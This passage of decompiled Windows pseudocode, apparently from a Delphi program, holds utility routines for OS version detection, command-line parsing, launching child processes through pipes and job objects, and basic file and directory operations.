    {
      do
      {
        sub_428E60(this, v2, &v9);
        sub_407AD8(v9, 1, 1, &v10);
        sub_407AA0(v10, (int)sub_425CA4);
        if ( v3 )
          sub_429350(this, v2);
        --v2;
      }
      while ( v2 != -1 );
    }
    v12 = 1;
    __writefsdword(0, v5[0]);
    v6 = (int *)&loc_425C69;
    FreeEnvironmentStringsW(EnvironmentStringsW);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_425C8B;
  sub_406CA4((int)&v9, 2);
  return v12;
}
// 425C36: variable 'v3' is possibly undefined
// 425CA4: using guessed type int sub_425CA4();

//----- (00425CB0) --------------------------------------------------------
BOOL sub_425CB0()
{
  struct _OSVERSIONINFOEXW VersionInformation; // [esp+0h] [ebp-124h] BYREF
  DWORDLONG dwlConditionMask; // [esp+11Ch] [ebp-8h]

  sub_4051B8(&VersionInformation, 284, 0);
  VersionInformation.wProductType = 1;
  dwlConditionMask = VerSetConditionMask_0(0i64, 0x80u, 1u);
  return !VerifyVersionInfoW_0(&VersionInformation, 0x80u, dwlConditionMask);
}

//----- (00425D10) --------------------------------------------------------
void sub_425D10()
{
  unsigned __int16 v0; // si
  DWORD dwMajorVersion; // eax
  DWORD v2; // eax
  DWORD dwMinorVersion; // eax
  bool v4; // cf
  DWORD v5; // eax
  DWORD v6; // eax
  DWORD v7; // eax
  DWORD v8; // eax

  if ( !byte_466924 )
  {
    sub_4051B8(&VersionInformation, 284, 0);
    sub_4051B8(&SystemInfo, 36, 0);
    dword_466930 = 0;
    VersionInformation.dwOSVersionInfoSize = 284;
    if ( GetVersionExW_0(&VersionInformation) )
    {
      v0 = *((_WORD *)&VersionInformation + 138);
      dword_466928 = v0;
      if ( *off_467EB8
        && !((int (__stdcall *)(DWORD, DWORD, _DWORD, _DWORD, int *))*off_467EB8)(
              VersionInformation.dwMajorVersion,
              VersionInformation.dwMinorVersion,
              v0,
              *((unsigned __int16 *)&VersionInformation + 139),
              &dword_466930) )
      {
        dword_466930 = 0;
      }
      if ( *off_468108
        && ((dwMajorVersion = VersionInformation.dwMajorVersion, dwMajorVersion >= 5)
         && VersionInformation.dwMinorVersion
         || dwMajorVersion > 5) )
      {
        ((void (__stdcall *)(struct _SYSTEM_INFO *))*off_468108)(&SystemInfo);
      }
      else
      {
        GetSystemInfo_0(&SystemInfo);
      }
      if ( VersionInformation.dwPlatformId == 2 )
      {
        byte_46692C = byte_4669D0[SystemInfo.wProcessorArchitecture == 9];
        byte_46692D = sub_425CB0();
        v2 = VersionInformation.dwMajorVersion;
        if ( v2 < 0xA )
        {
          if ( v2 == 6 )
          {
            dwMinorVersion = VersionInformation.dwMinorVersion;
            v4 = dwMinorVersion == 0;
            v5 = dwMinorVersion - 1;
            if ( v4 )
            {
              byte_46692D = *((_BYTE *)&VersionInformation + 282) != 1;
              byte_466924 = 3;
            }
            else if ( v5 )
            {
              v6 = v5 - 1;
              if ( v6 )
              {
                if ( v6 == 1 )
                  byte_466924 = 6;
              }
              else
              {
                byte_46692D = *((_BYTE *)&VersionInformation + 282) != 1;
                byte_466924 = 5;
              }
            }
            else
            {
              byte_46692D = *((_BYTE *)&VersionInformation + 282) != 1;
              byte_466924 = 4;
            }
          }
          else if ( v2 == 5 )
          {
            v7 = VersionInformation.dwMinorVersion;
            v4 = v7 == 0;
            v8 = v7 - 1;
            if ( v4 )
            {
              byte_466924 = 1;
            }
            else if ( v8 )
            {
              if ( v8 == 1 )
              {
                byte_46692D = *((_BYTE *)&VersionInformation + 282) != 1;
                byte_466924 = 2;
              }
            }
            else
            {
              byte_466924 = 2;
            }
          }
        }
        else
        {
          byte_466924 = 7;
        }
      }
    }
  }
}
// 466924: using guessed type char byte_466924;
// 466928: using guessed type int dword_466928;
// 46692C: using guessed type char byte_46692C;
// 46692D: using guessed type char byte_46692D;
// 466930: using guessed type int dword_466930;
// 467EB8: using guessed type int *off_467EB8;
// 468108: using guessed type int *off_468108;

//----- (00425ED0) --------------------------------------------------------
bool __fastcall sub_425ED0(unsigned __int8 a1, int a2)
{
  sub_425D10();
  return a1 < (unsigned __int8)byte_466924 || a1 == byte_466924 && a2 <= dword_466928;
}
// 466924: using guessed type char byte_466924;
// 466928: using guessed type int dword_466928;

//----- (00425F00) --------------------------------------------------------
int sub_425F00()
{
  sub_425D10();
  return (unsigned __int8)byte_46692D;
}
// 46692D: using guessed type char byte_46692D;

//----- (00425F20) --------------------------------------------------------
int sub_425F20()
{
  sub_425D10();
  return (unsigned __int8)byte_46692C;
}
// 46692C: using guessed type char byte_46692C;

//----- (00425F40) --------------------------------------------------------
void __fastcall sub_425F40(struct _OSVERSIONINFOW *a1)
{
  sub_425D10();
  qmemcpy(a1, &VersionInformation, 0x11Cu);
}

//----- (00425F60) --------------------------------------------------------
int sub_425F60()
{
  sub_425D10();
  return dword_466930;
}
// 466930: using guessed type int dword_466930;

//----- (00425F70) --------------------------------------------------------
int __fastcall sub_425F70(int a1, int a2, int a3)
{
  HANDLE CurrentProcess; // eax
  int v5; // [esp+0h] [ebp-4h] BYREF

  v5 = a3;
  if ( !byte_466935 )
  {
    byte_466934 = 0;
    v5 = 0;
    if ( *off_468144 )
    {
      CurrentProcess = GetCurrentProcess();
      if ( ((int (__stdcall *)(HANDLE, int *))*off_468144)(CurrentProcess, &v5) )
        byte_466934 = v5 != 0;
    }
    byte_466935 = 1;
  }
  return (unsigned __int8)byte_466934;
}
// 466934: using guessed type char byte_466934;
// 466935: using guessed type char byte_466935;
// 468144: using guessed type int *off_468144;

//----- (00425FD0) --------------------------------------------------------
int sub_425FD0()
{
  int v0; // esi
  LPWSTR CommandLineW_0; // eax
  int v2; // ebx
  unsigned int v4[2]; // [esp-14h] [ebp-18h] BYREF
  int *v5; // [esp-Ch] [ebp-10h]
  int v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_426029;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v0 = 0;
  sub_406C44(&v6);
  CommandLineW_0 = GetCommandLineW_0();
  v2 = sub_423A30(CommandLineW_0, &v6);
  while ( 1 )
  {
    v2 = sub_423A30(v2, &v6);
    if ( !v6 )
      break;
    ++v0;
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_426030;
  sub_406C44(&v6);
  return v0;
}
// 423A30: using guessed type int __fastcall sub_423A30(_DWORD, _DWORD);

//----- (00426040) --------------------------------------------------------
int *__fastcall sub_426040(int a1, int *a2)
{
  int *result; // eax
  LPWSTR CommandLineW_0; // edi

  sub_406C44(a2);
  if ( !a1 )
    return sub_427410(0, a2);
  CommandLineW_0 = GetCommandLineW_0();
  while ( 1 )
  {
    result = (int *)sub_423A30(CommandLineW_0, a2);
    CommandLineW_0 = (LPWSTR)result;
    if ( !a1 || !*a2 )
      break;
    --a1;
  }
  return result;
}
// 423A30: using guessed type int __fastcall sub_423A30(_DWORD, _DWORD);

//----- (004260A0) --------------------------------------------------------
BOOL __usercall sub_4260A0@<eax>(void *a1@<eax>, unsigned __int8 a2@<dl>, int a3)
{
  BOOL result; // eax
  _WORD *v4; // edx
  int v5; // eax
  void *v6; // esi
  DWORD v7; // ebx
  int v8; // eax
  const void *v9; // eax
  void *v10; // [esp-4h] [ebp-14h]

  do
  {
    *(_DWORD *)(a3 - 4) = 0;
    result = PeekNamedPipe(a1, 0, 0, 0, (LPDWORD)(a3 - 4), 0);
    if ( !result )
      break;
    result = a3;
    if ( !*(_DWORD *)(a3 - 4) )
      break;
    sub_4075BC((_DWORD *)(a3 - 8), *(_DWORD *)(a3 - 4), 0);
    v4 = (_WORD *)sub_4071C8(a3 - 8);
    v5 = *(_DWORD *)(a3 - 8);
    if ( v5 )
      v5 = *(_DWORD *)(v5 - 4);
    sub_4051B8(v4, v5, 0);
    *(_DWORD *)(a3 - 4) = 0;
    v6 = (void *)sub_4071C8(a3 - 8);
    v7 = *(_DWORD *)(a3 - 8);
    if ( v7 )
      v7 = *(_DWORD *)(v7 - 4);
    result = ReadFile(a1, v6, v7, (LPDWORD)(a3 - 4), 0);
    if ( !result )
      break;
    if ( *(_DWORD *)(a3 - 4) )
    {
      if ( *(_WORD *)(*(_DWORD *)(a3 - 12) + 42) )
      {
        (*(void (__fastcall **)(_DWORD, _DWORD, _DWORD))(*(_DWORD *)(a3 - 12) + 40))(
          *(_DWORD *)(*(_DWORD *)(a3 - 12) + 44),
          *(_DWORD *)(a3 - 8),
          a2);
      }
      else
      {
        v8 = *(_DWORD *)(*(_DWORD *)(a3 - 12) + 32);
        if ( v8 )
          v8 = *(_DWORD *)(v8 - 4);
        *(_DWORD *)(a3 - 16) = v8;
        sub_4075BC((_DWORD *)(*(_DWORD *)(a3 - 12) + 32), *(_DWORD *)(a3 - 4) + *(_DWORD *)(a3 - 16), 0);
        v10 = (void *)(*(_DWORD *)(a3 - 16) + sub_4071C8(*(_DWORD *)(a3 - 12) + 32));
        v9 = (const void *)sub_4071C8(a3 - 8);
        System::Move(v9, v10, *(_DWORD *)(a3 - 4));
      }
    }
    result = a3;
  }
  while ( *(_DWORD *)(a3 - 4) );
  return result;
}
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);

//----- (00426210) --------------------------------------------------------
int __usercall sub_426210@<eax>(int a1@<eax>, DWORD a2@<ebx>)
{
  const WCHAR *v2; // eax
  const void *v3; // eax
  int v4; // eax
  void *v5; // esi
  char v6; // bl
  WORD v7; // ax
  const WCHAR *v8; // edi
  DWORD TickCount_0; // esi
  DWORD v10; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *v12; // [esp-30h] [ebp-168h] BYREF
  void *v13; // [esp-2Ch] [ebp-164h]
  int *v14; // [esp-28h] [ebp-160h]
  struct _EXCEPTION_REGISTRATION_RECORD *v15; // [esp-24h] [ebp-15Ch] BYREF
  int *v16; // [esp-20h] [ebp-158h]
  int *v17; // [esp-1Ch] [ebp-154h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-150h] BYREF
  void *v19; // [esp-14h] [ebp-14Ch]
  int *v20; // [esp-10h] [ebp-148h]
  unsigned int v21[2]; // [esp-Ch] [ebp-144h] BYREF
  int *v22; // [esp-4h] [ebp-13Ch]
  int *v23; // [esp+Ch] [ebp-12Ch] BYREF
  char JobObjectInformation[16]; // [esp+10h] [ebp-128h] BYREF
  int v25; // [esp+20h] [ebp-118h]
  struct _SECURITY_ATTRIBUTES PipeAttributes; // [esp+84h] [ebp-B4h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+90h] [ebp-A8h] BYREF
  struct _STARTUPINFOW StartupInfo; // [esp+A0h] [ebp-98h] BYREF
  int v29; // [esp+E4h] [ebp-54h]
  DWORD ReturnLength; // [esp+E8h] [ebp-50h] BYREF
  UINT uMode; // [esp+ECh] [ebp-4Ch]
  HANDLE hJob; // [esp+F0h] [ebp-48h]
  HANDLE v33; // [esp+F4h] [ebp-44h] BYREF
  HANDLE v34; // [esp+F8h] [ebp-40h] BYREF
  HANDLE hObject; // [esp+FCh] [ebp-3Ch] BYREF
  HANDLE v36; // [esp+100h] [ebp-38h] BYREF
  HANDLE hWritePipe; // [esp+104h] [ebp-34h] BYREF
  HANDLE hReadPipe; // [esp+108h] [ebp-30h] BYREF
  DWORD ExitCode; // [esp+10Ch] [ebp-2Ch] BYREF
  DWORD dwCreationFlags; // [esp+110h] [ebp-28h]
  LPWSTR lpCommandLine; // [esp+114h] [ebp-24h]
  unsigned __int8 v42; // [esp+11Bh] [ebp-1Dh]
  int v43; // [esp+11Ch] [ebp-1Ch] BYREF
  __int32 v44; // [esp+120h] [ebp-18h] BYREF
  __int32 v45; // [esp+124h] [ebp-14h] BYREF
  int v46; // [esp+12Ch] [ebp-Ch]
  DWORD nNumberOfBytesToWrite; // [esp+130h] [ebp-8h] BYREF
  DWORD NumberOfBytesWritten; // [esp+134h] [ebp-4h] BYREF
  int savedregs; // [esp+138h] [ebp+0h] BYREF

  v23 = 0;
  v45 = 0;
  v44 = 0;
  nNumberOfBytesToWrite = 0;
  v43 = 0;
  v46 = a1;
  v22 = &savedregs;
  v21[1] = (unsigned int)&loc_4267ED;
  v21[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v21);
  v42 = 0;
  *(_DWORD *)(a1 + 52) = 0;
  sub_406C68((_DWORD *)(v46 + 32));
  if ( *(_DWORD *)v46 )
  {
    dwCreationFlags = 0;
    hWritePipe = (HANDLE)-1;
    hObject = (HANDLE)-1;
    hReadPipe = (HANDLE)-1;
    v36 = (HANDLE)-1;
    v33 = (HANDLE)-1;
    v34 = (HANDLE)-1;
    uMode = 0;
    v20 = &savedregs;
    v19 = &loc_4267B5;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    if ( *(_BYTE *)(v46 + 49) )
      uMode = SetErrorMode(0x8003u);
    if ( *(_BYTE *)(v46 + 48) )
    {
      v2 = (const WCHAR *)sub_407790((int)off_4669D4);
      hJob = OpenJobObjectW(6u, -1, v2);
      if ( hJob )
      {
        v17 = &savedregs;
        v16 = (int *)&loc_42634A;
        v15 = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)&v15);
        ReturnLength = 0;
        if ( QueryInformationJobObject(
               hJob,
               JobObjectExtendedLimitInformation,
               JobObjectInformation,
               0x70u,
               &ReturnLength) )
        {
          v25 |= 0x800u;
          SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, JobObjectInformation, 0x70u);
        }
        __writefsdword(0, (unsigned int)v15);
        v17 = (int *)&loc_426351;
        CloseHandle_0(hJob);
      }
    }
    if ( *(_BYTE *)(v46 + 24) )
    {
      sub_4051B8(&PipeAttributes, 12, 0);
      PipeAttributes.nLength = 12;
      PipeAttributes.bInheritHandle = -1;
      if ( !CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0) )
      {
        *(_DWORD *)(v46 + 52) = -4;
        System::__linkproc__ TryFinallyExit(ExceptionList, v19, v20);
        goto LABEL_65;
      }
      if ( !CreatePipe(&v36, &hObject, &PipeAttributes, 0) )
      {
        *(_DWORD *)(v46 + 52) = -5;
        System::__linkproc__ TryFinallyExit(ExceptionList, v19, v20);
        goto LABEL_65;
      }
      if ( !CreatePipe(&v34, &v33, &PipeAttributes, 0) )
      {
        *(_DWORD *)(v46 + 52) = -6;
        System::__linkproc__ TryFinallyExit(ExceptionList, v19, v20);
        goto LABEL_65;
      }
      sub_40732C((volatile __int32 *)&nNumberOfBytesToWrite, *(_DWORD **)(v46 + 28), dword_42680C);
      NumberOfBytesWritten = 0;
      v3 = (const void *)sub_4071C8(&nNumberOfBytesToWrite);
      a2 = nNumberOfBytesToWrite;
      if ( nNumberOfBytesToWrite )
        a2 = *(_DWORD *)(nNumberOfBytesToWrite - 4);
      if ( !WriteFile_1(hWritePipe, v3, a2, &NumberOfBytesWritten, 0) )
      {
        *(_DWORD *)(v46 + 52) = -7;
        System::__linkproc__ TryFinallyExit(ExceptionList, v19, v20);
        goto LABEL_65;
      }
    }
    v29 = *(_DWORD *)(v46 + 12);
    v4 = v29;
    if ( v29 )
      v4 = *(_DWORD *)(v29 - 4);
    if ( v4 <= 0 )
    {
      v5 = 0;
    }
    else
    {
      sub_424820(*(_DWORD *)(v46 + 12), (int)&dword_42681C, (volatile __int32 *)&v23);
      v17 = v23;
      v16 = &dword_42681C;
      v15 = (struct _EXCEPTION_REGISTRATION_RECORD *)&dword_42681C;
      sub_4079F0(&v43, 3);
      v5 = (void *)sub_407790(v43);
      dwCreationFlags |= 0x400u;
    }
    sub_423AF0(*(_DWORD *)v46, &v45, a2, (int)v5);
    sub_424890(v45, *(_DWORD *)(v46 + 4), (int)&str___1[1], &v44);
    lpCommandLine = (LPWSTR)sub_407790(v44);
    v6 = 0;
    sub_4051B8(&StartupInfo, 68, 0);
    StartupInfo.cb = 68;
    v7 = *(_WORD *)(v46 + 16);
    StartupInfo.wShowWindow = v7;
    StartupInfo.dwFlags = 1;
    if ( *(_BYTE *)(v46 + 24) )
    {
      StartupInfo.dwFlags |= 0x100u;
      StartupInfo.hStdInput = hReadPipe;
      StartupInfo.hStdOutput = hObject;
      StartupInfo.hStdError = v33;
      v6 = 1;
    }
    if ( !v7 )
      dwCreationFlags |= 0x8000000u;
    if ( *(_BYTE *)(v46 + 48) )
      dwCreationFlags |= 0x1000000u;
    sub_4051B8(&ProcessInformation, 16, 0);
    v8 = 0;
    if ( *(_DWORD *)(v46 + 20) )
      v8 = (const WCHAR *)sub_407790(*(_DWORD *)(v46 + 20));
    if ( !CreateProcessW_0(
            0,
            lpCommandLine,
            0,
            0,
            -(v6 != 0),
            dwCreationFlags,
            v5,
            v8,
            &StartupInfo,
            &ProcessInformation) )
    {
      *(_DWORD *)(v46 + 52) = -2;
      System::__linkproc__ TryFinallyExit(v15, v16, v17);
      goto LABEL_65;
    }
    *(_DWORD *)(v46 + 60) = ProcessInformation.hProcess;
    v14 = &savedregs;
    v13 = &loc_426723;
    v12 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v12);
    CloseHandle_0(ProcessInformation.hThread);
    if ( *(_BYTE *)(v46 + 24) )
    {
      TickCount_0 = GetTickCount_0();
      while ( 1 )
      {
        v10 = WaitForSingleObject(*(HANDLE *)(v46 + 60), 0x64u);
        if ( v10 == -1 )
          goto LABEL_38;
        sub_4260A0(v36, 0, (int)&savedregs);
        sub_4260A0(v34, 1u, (int)&savedregs);
        if ( *(_DWORD *)(v46 + 8) != -1 && GetTickCount_0() - TickCount_0 > *(_DWORD *)(v46 + 8) || v10 != 258 )
          goto LABEL_44;
      }
    }
    if ( WaitForSingleObject(*(HANDLE *)(v46 + 60), *(_DWORD *)(v46 + 8)) == -1 )
    {
LABEL_38:
      *(_DWORD *)(v46 + 52) = -1;
      System::__linkproc__ TryFinallyExit(v12, v13, v14);
      System::__linkproc__ TryFinallyExit(v15, v16, v17);
      goto LABEL_65;
    }
LABEL_44:
    ExitCode = 0;
    if ( GetExitCodeProcess(*(HANDLE *)(v46 + 60), &ExitCode) )
    {
      *(_DWORD *)(v46 + 52) = ExitCode;
      v42 = 1;
      __writefsdword(0, (unsigned int)v12);
      v14 = (int *)&loc_42672A;
      if ( *(_DWORD *)(v46 + 60) && *(_BYTE *)(v46 + 56) )
      {
        CloseHandle_0(*(HANDLE *)(v46 + 60));
        *(_DWORD *)(v46 + 60) = 0;
      }
      __writefsdword(0, (unsigned int)v15);
      v17 = (int *)&loc_4267BF;
      if ( !v42 )
        sub_406C68((_DWORD *)(v46 + 32));
      if ( hWritePipe != (HANDLE)-1 )
        CloseHandle_0(hWritePipe);
      if ( hObject != (HANDLE)-1 )
        CloseHandle_0(hObject);
      if ( hReadPipe != (HANDLE)-1 )
        CloseHandle_0(hReadPipe);
      if ( v36 != (HANDLE)-1 )
        CloseHandle_0(v36);
      if ( v33 != (HANDLE)-1 )
        CloseHandle_0(v33);
      if ( v34 != (HANDLE)-1 )
        CloseHandle_0(v34);
      if ( *(_BYTE *)(v46 + 49) )
        SetErrorMode(uMode);
    }
    else
    {
      *(_DWORD *)(v46 + 52) = -3;
      *(_DWORD *)(v46 + 60) = 0;
      System::__linkproc__ TryFinallyExit(v12, v13, v14);
      System::__linkproc__ TryFinallyExit(v15, v16, v17);
    }
  }
LABEL_65:
  __writefsdword(0, v21[0]);
  v22 = (int *)&loc_4267F4;
  sub_406C44(&v23);
  sub_406CA4((int)&v43, 3);
  sub_406C68(&nNumberOfBytesToWrite);
  return v42;
}
// 426703: conditional instruction was optimized away because %var_1D.1==1
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 42680C: using guessed type int dword_42680C[4];
// 42681C: using guessed type int dword_42681C;
// 426824: using guessed type _strings str___1[1];
// 4669D4: using guessed type wchar_t *off_4669D4;

//----- (00426830) --------------------------------------------------------
_DWORD *__fastcall sub_426830(int a1, int *a2)
{
  const WCHAR *v4; // eax
  int v5; // ecx
  int FullPathNameW; // esi
  const WCHAR *v7; // eax
  int v8; // ecx
  int v9; // esi
  int v10; // eax
  int v11; // eax
  bool v12; // al
  WCHAR *v14; // [esp-14h] [ebp-230h]
  unsigned int v15[2]; // [esp-Ch] [ebp-228h] BYREF
  int *v16; // [esp-4h] [ebp-220h]
  WCHAR Buffer[260]; // [esp+Ch] [ebp-210h] BYREF
  LPWSTR FilePart; // [esp+214h] [ebp-8h] BYREF
  int v19; // [esp+218h] [ebp-4h] BYREF
  int savedregs; // [esp+21Ch] [ebp+0h] BYREF

  v19 = 0;
  v16 = &savedregs;
  v15[1] = (unsigned int)&loc_42692B;
  v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  FilePart = 0;
  v4 = (const WCHAR *)sub_407790(a1);
  FullPathNameW = GetFullPathNameW(v4, 0x104u, Buffer, &FilePart);
  if ( FullPathNameW > 260 )
  {
    sub_407890(a2, FullPathNameW, v5);
    v14 = (WCHAR *)sub_407790(*a2);
    v7 = (const WCHAR *)sub_407790(a1);
    v9 = GetFullPathNameW(v7, FullPathNameW, v14, &FilePart);
    v10 = *a2;
    if ( *a2 )
      v10 = *(_DWORD *)(v10 - 4);
    if ( v10 > v9 )
      sub_407890(a2, v9, v8);
  }
  else
  {
    sub_406D90(a2, Buffer, FullPathNameW);
  }
  v11 = *a2;
  if ( *a2 )
    v11 = *(_DWORD *)(v11 - 4);
  v12 = v11 >= 2 && *(_WORD *)*a2 == 92;
  if ( !v12 || *(_WORD *)(*a2 + 2) != 92 )
  {
    sub_427370(*a2, &v19);
    if ( v19 )
      sub_406FE8(a2, v19);
  }
  __writefsdword(0, v15[0]);
  v16 = (int *)&loc_426932;
  return sub_406C44(&v19);
}
// 426892: conditional instruction was optimized away because eax.4>=105
// 426898: variable 'v5' is possibly undefined
// 4268CC: variable 'v8' is possibly undefined

//----- (00426940) --------------------------------------------------------
_DWORD *__fastcall sub_426940(int a1, _DWORD *a2)
{
  _WORD *v2; // ebx
  int v3; // edx
  int v6; // eax
  int v9; // edi
  int v10; // esi

  v2 = (_WORD *)a1;
  v3 = a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  if ( a1 >= 2 && v2[1] == 58 )
    return sub_407AD8((int)v2, 1, 2, a2);
  v6 = v3;
  if ( v3 )
    v6 = *(_DWORD *)(v3 - 4);
  if ( v6 < 2 || *v2 != 92 || v2[1] != 92 )
    return sub_406C44(a2);
  v9 = 0;
  v10 = 3;
  while ( v10 < System::__linkproc__ LStrLen(v2) && v9 < 2 )
  {
    if ( v2[v10 - 1] == 92 )
      ++v9;
    if ( v9 < 2 )
      ++v10;
  }
  if ( v2[v10 - 1] == 92 )
    --v10;
  return sub_407AD8((int)v2, 1, v10, a2);
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (00426A10) --------------------------------------------------------
_DWORD *__fastcall sub_426A10(int cchLength, int *a2)
{
  int v2; // esi
  int v3; // ebx
  void *v4; // eax
  _DWORD *result; // eax
  WCHAR *v6; // eax

  v2 = cchLength;
  if ( cchLength )
    cchLength = *(_DWORD *)(cchLength - 4);
  v3 = cchLength;
  v4 = (void *)sub_407790(v2);
  result = sub_406D90(a2, v4, v3);
  if ( v3 > 0 )
  {
    v6 = (WCHAR *)sub_407790(*a2);
    return (_DWORD *)CharUpperBuffW(v6, v3);
  }
  return result;
}

//----- (00426A60) --------------------------------------------------------
_DWORD *__fastcall sub_426A60(int cchLength, int *a2)
{
  int v2; // esi
  int v3; // ebx
  void *v4; // eax
  _DWORD *result; // eax
  WCHAR *v6; // eax

  v2 = cchLength;
  if ( cchLength )
    cchLength = *(_DWORD *)(cchLength - 4);
  v3 = cchLength;
  v4 = (void *)sub_407790(v2);
  result = sub_406D90(a2, v4, v3);
  if ( v3 > 0 )
  {
    v6 = (WCHAR *)sub_407790(*a2);
    return (_DWORD *)CharLowerBuffW(v6, v3);
  }
  return result;
}

//----- (00426AB0) --------------------------------------------------------
int __fastcall sub_426AB0(int cchCount1, int a2)
{
  int v3; // ebx
  int v4; // esi
  const WCHAR *v5; // eax
  const WCHAR *v7; // [esp-8h] [ebp-18h]

  v3 = cchCount1;
  if ( cchCount1 )
    v3 = *(_DWORD *)(cchCount1 - 4);
  v4 = a2;
  if ( a2 )
    v4 = *(_DWORD *)(a2 - 4);
  v7 = (const WCHAR *)sub_407790(a2);
  v5 = (const WCHAR *)sub_407790(cchCount1);
  return CompareStringW_0(0x400u, 1u, v5, v3, v7, v4) - 2;
}

//----- (00426B00) --------------------------------------------------------
int __fastcall sub_426B00(int a1)
{
  const WCHAR *v2; // eax
  DWORD FileAttributesW; // eax
  __int64 v5; // [esp+Ch] [ebp-10h]
  __int64 v6; // [esp+14h] [ebp-8h] BYREF

  v6 = ((__int64 (__cdecl *)())dword_466834)();
  v2 = (const WCHAR *)sub_407790(a1);
  FileAttributesW = GetFileAttributesW(v2);
  if ( FileAttributesW == -1 )
    a1 = 0;
  else
    LOBYTE(a1) = (FileAttributesW & 0x10) == 0;
  v5 = sub_423850(&v6);
  if ( qword_466808 < v5 )
    qword_466808 = v5;
  return a1;
}
// 466808: using guessed type __int64 qword_466808;
// 466834: using guessed type __int64 (__cdecl *dword_466834)(_DWORD, _DWORD, _DWORD);

//----- (00426B80) --------------------------------------------------------
BOOL __fastcall sub_426B80(int a1, int a2)
{
  const WCHAR *v3; // eax
  const WCHAR *v5; // [esp-4h] [ebp-Ch]

  v5 = (const WCHAR *)sub_407790(a2);
  v3 = (const WCHAR *)sub_407790(a1);
  return MoveFileW(v3, v5);
}

//----- (00426BB0) --------------------------------------------------------
BOOL __fastcall sub_426BB0(int a1)
{
  const WCHAR *v2; // edi
  BOOL v3; // eax
  BOOL v4; // ebx
  DWORD FileAttributesW; // eax
  const WCHAR *v6; // ebx
  unsigned int v8; // [esp-4h] [ebp-10h]

  v2 = (const WCHAR *)sub_407790(a1);
  v3 = DeleteFileW(v2);
  v4 = v3;
  if ( !v3 )
  {
    FileAttributesW = GetFileAttributesW(v2);
    if ( FileAttributesW != -1 && (FileAttributesW & 1) != 0 )
    {
      v8 = FileAttributesW & 0xFFFFFFFE;
      v6 = (const WCHAR *)sub_407790(a1);
      SetFileAttributesW(v6, v8);
      return DeleteFileW(v6);
    }
  }
  return v4;
}

//----- (00426C10) --------------------------------------------------------
int __usercall sub_426C10@<eax>(int a1@<eax>, int a2@<ebx>)
{
  const WCHAR *v3; // eax
  DWORD FileAttributesW; // eax
  const WCHAR *v5; // eax
  unsigned int v7; // [esp-4h] [ebp-10h]

  LOBYTE(a2) = 1;
  v3 = (const WCHAR *)sub_407790(a1);
  FileAttributesW = GetFileAttributesW(v3);
  if ( FileAttributesW != -1 && (FileAttributesW & 1) != 0 )
  {
    v7 = FileAttributesW & 0xFFFFFFFE;
    v5 = (const WCHAR *)sub_407790(a1);
    if ( !SetFileAttributesW(v5, v7) )
      return 0;
  }
  return a2;
}

//----- (00426C60) --------------------------------------------------------
bool __fastcall sub_426C60(int a1)
{
  const WCHAR *v1; // eax
  DWORD FileAttributesW; // eax

  v1 = (const WCHAR *)sub_407790(a1);
  FileAttributesW = GetFileAttributesW(v1);
  return FileAttributesW != -1 && (FileAttributesW & 1) != 0;
}

//----- (00426C90) --------------------------------------------------------
int __fastcall sub_426C90(int a1)
{
  const WCHAR *v2; // eax
  DWORD FileAttributesW; // eax
  __int64 v5; // [esp+Ch] [ebp-10h]
  __int64 v6; // [esp+14h] [ebp-8h] BYREF

  v6 = ((__int64 (__cdecl *)())dword_466834)();
  v2 = (const WCHAR *)sub_407790(a1);
  FileAttributesW = GetFileAttributesW(v2);
  if ( FileAttributesW == -1 )
    a1 = 0;
  else
    LOBYTE(a1) = (FileAttributesW & 0x10) != 0;
  v5 = sub_423850(&v6);
  if ( qword_466810 < v5 )
    qword_466810 = v5;
  return a1;
}
// 466810: using guessed type __int64 qword_466810;
// 466834: using guessed type __int64 (__cdecl *dword_466834)(_DWORD, _DWORD, _DWORD);

//----- (00426D20) --------------------------------------------------------
BOOL __fastcall sub_426D20(int a1)
{
  const WCHAR *v1; // eax

  v1 = (const WCHAR *)sub_407790(a1);
  return CreateDirectoryW(v1, 0);
}

//----- (00426D40) --------------------------------------------------------
BOOL __fastcall sub_426D40(int a1)
{
  const WCHAR *v1; // eax

  v1 = (const WCHAR *)sub_407790(a1);
  return RemoveDirectoryW(v1);
}

//----- (00426D60) --------------------------------------------------------
HANDLE __fastcall sub_426D60(int a1, __int16 a2)
{
  HANDLE FileW_0; // esi
  int v4; // eax
  unsigned int v5; // edx
  DWORD v6; // ebx
  DWORD v7; // esi
  DWORD v8; // edi
  const WCHAR *v9; // eax
  __int64 v11; // [esp+14h] [ebp-18h]
  __int64 v12; // [esp+1Ch] [ebp-10h] BYREF
  DWORD dwFlagsAndAttributes; // [esp+24h] [ebp-8h]
  int v14; // [esp+28h] [ebp-4h]

  v14 = a1;
  v12 = ((__int64 (__cdecl *)())dword_466834)();
  FileW_0 = (HANDLE)dword_4667E0;
  v4 = (unsigned __int8)a2;
  v5 = (unsigned __int16)(a2 & 0xFF00) >> 8;
  if ( (unsigned __int8)a2 <= 4u && v5 <= 2 )
  {
    v6 = dword_4669D8[(unsigned __int8)a2];
    v7 = dword_466A14[v5];
    v8 = dwCreationDisposition[v4];
